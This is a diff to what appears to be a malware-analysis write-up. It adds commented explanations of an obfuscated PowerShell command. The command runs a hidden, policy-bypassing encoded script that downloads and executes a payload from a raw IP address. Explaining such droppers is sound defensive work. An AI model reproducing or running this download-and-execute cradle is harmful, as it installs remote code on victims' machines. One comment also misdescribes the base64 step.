@@ -54,4 +54,19 @@ $b=$y+" "+$z+$a
 $x=$b|IEX
 ```
 
+Now we could break down each parts individually
+```powershell
+$x=''                                   # initialized empty string
+$y='IEX'                                # set to Invoke-Expression
+$z='powershell.exe -w h -ep b -e '      # call powershell with options 
+
+$a=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$c="http://73.58.34.118/OjKUiD2IFH.exe"                       # convert base64 string to unicode byte 
+$w=New-Object Net.WebClient             # initialized to download 
+$d=$w.DownloadString($c)                # download from $c which is the payload
+IEX $d'))                               # Invoke-Expression of the download
+
+$b=$y+" "+$z+$a                         # Putting the pieces together into variable b
+$x=$b|IEX                               # Run constructed command of b then passed to Invoke-Expression
+```
+
 
